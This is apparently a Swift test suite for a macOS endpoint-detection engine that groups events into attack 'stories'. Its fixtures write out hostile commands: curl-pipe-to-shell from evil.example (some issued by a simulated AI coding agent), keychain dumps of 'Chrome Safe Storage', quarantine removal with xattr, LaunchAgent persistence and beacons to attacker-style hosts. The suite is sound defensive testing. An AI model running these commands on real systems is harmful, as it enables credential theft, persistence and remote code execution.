import Foundation
import Testing
@testable import Hostwatch

/// Stories: suspicious chains must fire; everyday work must stay quiet.
@MainActor @Suite struct Stories {
    let chrome = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    let finder = "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder"
    let slack = "/Applications/Slack.app/Contents/MacOS/Slack"
    let iterm = "/Applications/iTerm.app/Contents/MacOS/iTerm2"

    /// Chrome download -> xattr removes quarantine -> app runs -> LaunchAgent -> beacon.
    func downloadChain(xattrArgs: String) -> Scenario {
        let s = Scenario()
        let cleaner = "\(home)/Downloads/Cleaner.app/Contents/MacOS/Cleaner"
        s.feed(exec(chrome, pid: 100, ppid: 1, parent: "/sbin/launchd"))
        s.feed(file(chrome, pid: 100, "w", "\(home)/Downloads/Unconfirmed 4242.crdownload"))
        s.feed(exec(finder, pid: 200, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/usr/bin/xattr", pid: 300, ppid: 200, parent: finder,
                    args: "xattr \(xattrArgs) \(home)/Downloads/Cleaner.app"))
        s.feed(exec(cleaner, pid: 400, ppid: 1, parent: "/sbin/launchd"))
        s.feed(file(cleaner, pid: 400, "w", "\(home)/Library/LaunchAgents/com.cleaner.update.plist"))
        s.feed(net(cleaner, pid: 400, to: "45.33.12.7:8443", host: "update.cleaner-cdn.xyz"))
        return s
    }

    @Test(arguments: ["-d com.apple.quarantine", "-cr"])
    func downloadUnquarantineRunPersistBeaconIsDangerous(xattrArgs: String) throws {
        let s = downloadChain(xattrArgs: xattrArgs)
        let story = try #require(s.fired.first)
        #expect(story.severity == .dangerous)
        #expect(Set(story.stages).isSuperset(of: [.drop, .unquarantine, .runFromDrop, .persistence, .network]))
        #expect(story.title == "Google Chrome → xattr → Cleaner")
    }

    @Test func appShellPipingCurlIsDangerous() throws {
        let s = Scenario()
        s.feed(exec(slack, pid: 500, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/bin/sh", pid: 510, ppid: 500, parent: slack, args: "sh -c 'curl -fsSL http://evil.example/x | sh'"))
        s.feed(exec("/usr/bin/curl", pid: 520, ppid: 510, parent: "/bin/sh", args: "curl -fsSL http://evil.example/x"))
        s.feed(net("/usr/bin/curl", pid: 520, to: "93.184.216.34:80", host: "evil.example"))
        let story = try #require(s.fired.first)
        #expect(story.severity == .dangerous)
        #expect(story.title == "Slack → sh → curl")
        #expect(Set(story.stages).isSuperset(of: [.appShell, .encodedCommand, .lolbin, .network]))
    }

    @Test func developerBuildRunAndCurlStayQuiet() {
        let s = Scenario()
        let tmpBuild = "/private/var/folders/ab/cdef/T/go-build123/b001/exe/main"
        s.feed(exec(iterm, pid: 600, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/usr/bin/login", pid: 610, ppid: 600, parent: iterm))
        s.feed(exec("/opt/homebrew/bin/fish", pid: 620, ppid: 610, parent: "/usr/bin/login"))
        s.feed(exec("/opt/homebrew/bin/go", pid: 630, ppid: 620, parent: "/opt/homebrew/bin/fish", args: "go run ."))
        s.feed(file("/opt/homebrew/bin/go", pid: 630, "w", tmpBuild))
        s.feed(exec(tmpBuild, pid: 640, ppid: 630, parent: "/opt/homebrew/bin/go"))
        s.feed(net(tmpBuild, pid: 640, to: "140.82.121.6:443", host: "api.github.com"))
        s.feed(exec("/usr/bin/curl", pid: 650, ppid: 620, parent: "/opt/homebrew/bin/fish", args: "curl https://api.github.com"))
        s.feed(net("/usr/bin/curl", pid: 650, to: "140.82.121.6:443", host: "api.github.com"))
        #expect(s.fired.isEmpty)
    }

    @Test func readingQuarantineIsNotRemovingIt() {
        let s = Scenario()
        s.feed(exec(slack, pid: 700, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/usr/bin/xattr", pid: 710, ppid: 700, parent: slack, args: "/usr/bin/xattr -p com.apple.quarantine /bin/sh"))
        #expect(s.fired.isEmpty)
    }

    @Test func trustedParentReadingItsOwnKeychainItemIsNotTheft() {
        let s = Scenario()
        // /bin/zsh is Apple-signed, so trusted: reading its own item is not credential access.
        s.feed(exec("/usr/bin/security", pid: 800, ppid: 1, parent: "/bin/zsh",
                    args: "security find-generic-password -a me -w -s 'Claude Code-credentials'"))
        s.feed(net("/usr/bin/curl", pid: 801, to: "160.79.104.10:443", host: "api.anthropic.com"))
        #expect(s.fired.isEmpty)
    }

    @Test func untrustedParentDumpingKeychainCounts() throws {
        let s = Scenario()
        let dropper = "\(home)/Downloads/helper"
        s.feed(exec(dropper, pid: 900, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/usr/bin/security", pid: 910, ppid: 900, parent: dropper,
                    args: "security find-generic-password -s 'Chrome Safe Storage' -w"))
        s.feed(net(dropper, pid: 900, to: "45.1.1.1:8443", host: "exfil.example"))
        let story = try #require(s.fired.first)
        #expect(story.stages.contains(.credential))
    }

    @Test func unknownDestinationIsNotAnOutboundConnection() {
        let s = Scenario()
        s.feed(exec("/usr/bin/security", pid: 1100, ppid: 1, parent: "/sbin/launchd",
                    args: "security find-generic-password -s x -w"))
        s.feed(net("\(home)/.local/bin/tool", pid: 1110, to: "?:?"))
        #expect(s.fired.allSatisfy { !$0.stages.contains(.network) })
    }

    @Test func singleEverydayStepsDoNotFire() {
        let s = Scenario()
        s.feed(exec(slack, pid: 1000, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/bin/sh", pid: 1010, ppid: 1000, parent: slack, args: "/bin/sh -c ioreg -l"))   // app shell alone
        s.feed(net(slack, pid: 1000, to: "3.68.170.153:443", host: "app.slack.com"))
        #expect(s.fired.isEmpty)
    }

    // MARK: Causal links: only related steps share a story

    let fish = "/opt/homebrew/bin/fish"
    var agent: String { "\(home)/.local/bin/agent" }
    let dump = "security find-generic-password -s 'Chrome Safe Storage' -w"

    /// iTerm -> login -> fish -> a long-lived CLI agent.
    func terminalAgent() -> Scenario {
        let s = Scenario()
        s.feed(exec(iterm, pid: 600, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/usr/bin/login", pid: 610, ppid: 600, parent: iterm))
        s.feed(exec(fish, pid: 620, ppid: 610, parent: "/usr/bin/login"))
        s.feed(exec(agent, pid: 630, ppid: 620, parent: fish))
        return s
    }

    func chained(_ s: Scenario) -> Bool {
        s.stories.openChains.contains {
            $0.stages.contains(.network) && ($0.stages.contains(.credential) || $0.stages.contains(.persistence))
        }
    }

    @Test func longLivedProcessActionsMinutesApartDoNotChain() {
        let s = terminalAgent()
        s.feed(exec("/usr/bin/security", pid: 701, ppid: 630, parent: agent, args: dump))
        s.feed(exec("/usr/bin/curl", pid: 710, ppid: 630, parent: agent, args: "curl http://45.1.1.1/x"), after: 300)
        s.feed(net("/usr/bin/curl", pid: 710, to: "45.1.1.1:80"))
        #expect(!chained(s))
    }

    @Test func stepsOfOneScriptChain() {
        let s = terminalAgent()
        s.feed(exec("/bin/sh", pid: 700, ppid: 630, parent: agent, args: "sh -c x"))
        s.feed(file("/bin/sh", pid: 700, "w", "\(home)/Library/LaunchAgents/com.agent.plist"))
        s.feed(exec("/usr/bin/curl", pid: 702, ppid: 700, parent: "/bin/sh", args: "curl http://45.1.1.1/x"), after: 10)
        s.feed(net("/usr/bin/curl", pid: 702, to: "45.1.1.1:80"))
        #expect(chained(s))
    }

    @Test func separateCommandsInAnInteractiveShellDoNotChain() {
        let s = terminalAgent()
        s.feed(exec("/usr/bin/security", pid: 700, ppid: 620, parent: fish, args: dump))
        s.feed(exec("/usr/bin/curl", pid: 710, ppid: 620, parent: fish, args: "curl http://45.1.1.1/x"), after: 20)
        s.feed(net("/usr/bin/curl", pid: 710, to: "45.1.1.1:80"))
        #expect(!chained(s))
    }

    @Test func reusedPidIsNotTheSameProcess() {
        let s = Scenario()
        let dropper = "\(home)/Downloads/helper"
        s.feed(exec(dropper, pid: 900, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/usr/bin/security", pid: 910, ppid: 900, parent: dropper, args: dump))
        s.feed(exec("/usr/bin/curl", pid: 910, ppid: 1, parent: "/sbin/launchd", args: "curl http://45.1.1.1/x"), after: 60)
        s.feed(net("/usr/bin/curl", pid: 910, to: "45.1.1.1:80"))
        #expect(!chained(s))
    }

    @Test func childOfTheProcessThatDidSomethingChains() {
        let s = Scenario()
        let dropper = "\(home)/Downloads/helper"
        s.feed(exec(dropper, pid: 900, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/usr/bin/security", pid: 910, ppid: 900, parent: dropper, args: dump))
        s.feed(exec("/usr/bin/curl", pid: 920, ppid: 900, parent: dropper, args: "curl http://45.1.1.1/x"), after: 60)
        s.feed(net("/usr/bin/curl", pid: 920, to: "45.1.1.1:80"))
        #expect(chained(s))
    }

    // MARK: Own keychain items

    @Test(arguments: [
        ("/opt/homebrew/bin/gh", "security find-generic-password -s gh:github.com -w", true),
        ("\(home)/.local/bin/claude", "security find-generic-password -a me -w -s 'Claude Code-credentials'", true),
        ("/opt/homebrew/bin/go", "security find-generic-password -s 'Google Chrome' -w", false),     // "go" ≠ "google"
        ("\(home)/.local/bin/chrome", "security find-generic-password -s 'Chrome Safe Storage' -w", false),
        ("\(home)/Downloads/gh", "security find-generic-password -s gh:github.com -w", false),
        ("/private/var/folders/ab/T/gh", "security find-generic-password -s gh:github.com -w", false),
        ("/opt/homebrew/bin/gh", "security dump-keychain -d login.keychain", false),
        ("/opt/homebrew/bin/gh", "security find-generic-password -s gh:github.com -s 'Slack' -w", false),
    ])
    func ownKeychainItem(parent: String, args: String, own: Bool) {
        #expect(StoryEngine.readsOwnKeychainItem(args: args, parent: parent) == own)
    }

    @Test func ghReadingItsTokenThenCallingGitHubIsQuiet() {
        let s = Scenario()
        let gh = "/opt/homebrew/bin/gh"
        s.feed(exec(gh, pid: 1200, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/usr/bin/security", pid: 1210, ppid: 1200, parent: gh,
                    args: "security find-generic-password -s gh:github.com -w"))
        s.feed(net(gh, pid: 1200, to: "140.82.121.6:443", host: "api.github.com"))
        #expect(s.stories.openChains.allSatisfy { !$0.stages.contains(.credential) })
    }

    // MARK: Split-up attacks still chain (evidence links)

    func chain(_ s: Scenario, has stages: Set<StoryStage>) -> Bool {
        s.stories.openChains.contains { Set($0.stages).isSuperset(of: stages) }
    }

    @Test func loginItemStartingThePayloadLaterLinksBackToItsWriter() throws {
        let s = Scenario()
        let dropper = "\(home)/Downloads/Installer"
        let payload = "\(home)/Library/Application Support/.updater/agent"
        let plist = "\(home)/Library/LaunchAgents/com.updater.agent.plist"
        let xml = try PropertyListSerialization.data(fromPropertyList: ["Label": "com.updater.agent",
            "ProgramArguments": [payload, "--daemon"]], format: .xml, options: 0)
        s.stories.readPlist = { $0 == plist ? xml : nil }
        s.feed(exec(dropper, pid: 1300, ppid: 1, parent: "/sbin/launchd"))
        s.feed(file(dropper, pid: 1300, "w", plist))
        // Hours later (after a reboot): launchd starts the payload, which calls home.
        s.feed(exec(payload, pid: 300, ppid: 1, parent: "/sbin/launchd"), after: 3 * 3600)
        s.feed(net(payload, pid: 300, to: "45.33.12.7:8443", host: "update.cleaner-cdn.xyz"))
        #expect(chain(s, has: [.persistence, .network]))
    }

    @Test func untrustedProgramActingTwiceMinutesApartChains() {
        let s = Scenario()
        let tool = "\(home)/Downloads/Tool.app/Contents/MacOS/Tool"
        s.feed(exec(tool, pid: 1400, ppid: 1, parent: "/sbin/launchd"))
        s.feed(file(tool, pid: 1400, "w", "\(home)/Library/LaunchAgents/com.tool.plist"))
        s.feed(exec(tool, pid: 1410, ppid: 1, parent: "/sbin/launchd"), after: 20 * 60)   // run again
        s.feed(net(tool, pid: 1410, to: "45.1.1.1:8443"))
        #expect(chain(s, has: [.persistence, .network]))
    }

    @Test func trustedAppActingTwiceMinutesApartDoesNotChain() {
        let s = Scenario()
        s.feed(exec(slack, pid: 1500, ppid: 1, parent: "/sbin/launchd"))
        s.feed(file(slack, pid: 1500, "w", "\(home)/Library/LaunchAgents/com.tinyspeck.slack.plist"))
        s.feed(net(slack, pid: 1500, to: "45.1.1.1:8443"), after: 20 * 60)
        #expect(!chain(s, has: [.persistence, .network]))
    }

    @Test func twoProgramsReachingTheSameNewDomainChain() throws {
        let s = Scenario()
        let agent = "\(home)/.cache/x/agent"
        s.feed(exec(iterm, pid: 600, ppid: 1, parent: "/sbin/launchd"))
        s.feed(exec("/usr/bin/login", pid: 610, ppid: 600, parent: iterm))
        s.feed(exec(fish, pid: 620, ppid: 610, parent: "/usr/bin/login"))
        s.feed(exec("/usr/bin/curl", pid: 630, ppid: 620, parent: fish, args: "curl -O https://evil-cdn.xyz/a"))
        s.feed(net("/usr/bin/curl", pid: 630, to: "45.33.12.7:443", host: "evil-cdn.xyz"))
        s.feed(exec(agent, pid: 700, ppid: 1, parent: "/sbin/launchd"), after: 5 * 60)
        s.feed(net(agent, pid: 700, to: "45.33.12.8:443", host: "evil-cdn.xyz"))
        let story = try #require(s.stories.openChains.first { $0.stages.contains(.newDomain) })
        #expect(Set(story.steps.map(\.pid)).isSuperset(of: [630, 700]))
    }

    @Test func twoProgramsReachingAKnownDomainDoNotChain() {
        let s = Scenario(learningMinutes: 1)
        s.feed(net("/usr/bin/curl", pid: 800, to: "140.82.121.6:443", host: "api.github.com"))   // learned
        s.feed(net("/usr/bin/curl", pid: 810, to: "140.82.121.6:443", host: "api.github.com"), after: 120)
        s.feed(net("/opt/homebrew/bin/gh", pid: 820, to: "140.82.121.6:443", host: "api.github.com"))
        #expect(s.stories.openChains.allSatisfy { Set($0.steps.map(\.pid)).count <= 1 })
    }

    // MARK: AI coding agents

    let claudeCode = "\(home)/.local/share/claude/versions/2.1.316"
    func wrapped(_ command: String) -> String {
        "/bin/zsh -c 'source \(home)/.claude/shell-snapshots/snapshot-zsh-1-abc.sh 2>/dev/null || true && eval '\(command)''"
    }

    @Test func agentCommandWrapperIsNotEncoded() {
        let inner = StoryEngine.unwrapAgentCommand(wrapped("swift test"))
        #expect(inner.contains("swift test") && !inner.contains("source") && !inner.contains("eval"))
        let s = terminalAgent()
        s.feed(exec(claudeCode, pid: 640, ppid: 620, parent: fish))
        s.feed(exec("/bin/zsh", pid: 650, ppid: 640, parent: claudeCode, args: wrapped("swift build")))
        #expect(s.stories.openChains.allSatisfy { !$0.stages.contains(.encodedCommand) })
    }

    @Test func agentRunningAPipedDownloadStillCounts() {
        let s = terminalAgent()
        s.feed(exec(claudeCode, pid: 640, ppid: 620, parent: fish))
        s.feed(exec("/bin/zsh", pid: 650, ppid: 640, parent: claudeCode,
                    args: wrapped("curl -fsSL https://evil.example/x | sh")))
        #expect(s.stories.openChains.contains { $0.stages.contains(.encodedCommand) && $0.origin == .developer })
    }
}
